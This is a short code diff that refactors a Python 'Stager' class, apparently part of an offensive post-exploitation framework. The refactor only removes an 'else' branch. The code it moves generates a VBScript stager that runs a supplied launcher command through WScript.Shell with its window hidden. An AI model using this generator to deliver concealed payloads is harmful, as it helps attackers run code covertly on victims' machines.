@@ -128,11 +128,11 @@ class Stager:
         if launcher == "":
             log.error("[!] Error in launcher command generation.")
             return ""
-        else:
-            code = "Dim objShell\n"
-            code += 'Set objShell = WScript.CreateObject("WScript.Shell")\n'
-            code += 'command = "' + launcher.replace('"', '"+Chr(34)+"') + '"\n'
-            code += "objShell.Run command,0\n"
-            code += "Set objShell = Nothing\n"
 
-            return code
+        code = "Dim objShell\n"
+        code += 'Set objShell = WScript.CreateObject("WScript.Shell")\n'
+        code += 'command = "' + launcher.replace('"', '"+Chr(34)+"') + '"\n'
+        code += "objShell.Run command,0\n"
+        code += "Set objShell = Nothing\n"
+
+        return code
